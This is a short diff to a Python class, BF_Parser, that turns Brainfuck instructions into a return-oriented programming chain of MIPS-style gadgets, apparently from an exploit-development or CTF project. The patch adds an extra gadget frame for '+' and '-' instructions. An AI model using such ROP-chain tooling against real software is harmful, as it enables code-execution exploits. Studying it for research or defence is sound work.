@@ -70,7 +70,7 @@ class BF_Parser():
                 total_len += charger_frame_sz
 
             elif instruction == '+' or instruction == '-':
-                total_len += 3 * charger_frame_sz + write_mem_frame_sz + read_mem_frame_sz + mov_a0_s0_frame_sz + and_a3_s0_frame_sz
+                total_len += 4 * charger_frame_sz + write_mem_frame_sz + read_mem_frame_sz + mov_a0_s0_frame_sz + and_a3_s0_frame_sz
 
             elif instruction == '.':
                 pass
@@ -138,6 +138,14 @@ class BF_Parser():
 
                 self.__construct_and_a3_s0(ra=self.__mov_s0_a0.get_vaddr())
                 rop_chain += self.__and_a3_s0.print_gadget()
+
+                self.__construct_charger(ra=self.__inc_a3.get_vaddr(), \
+                                         s1=-0x28, \
+                                         s3=0, \
+                                         s4=self.__store_s0.get_vaddr(), \
+                                         s8=self.__charger.get_vaddr() - 0x6d6
+                                        )
+                rop_chain += self.__charger.print_gadget()
 
                 self.__construct_charger(ra=self.__inc_a3.get_vaddr(), \
                                          s1=0x28, \
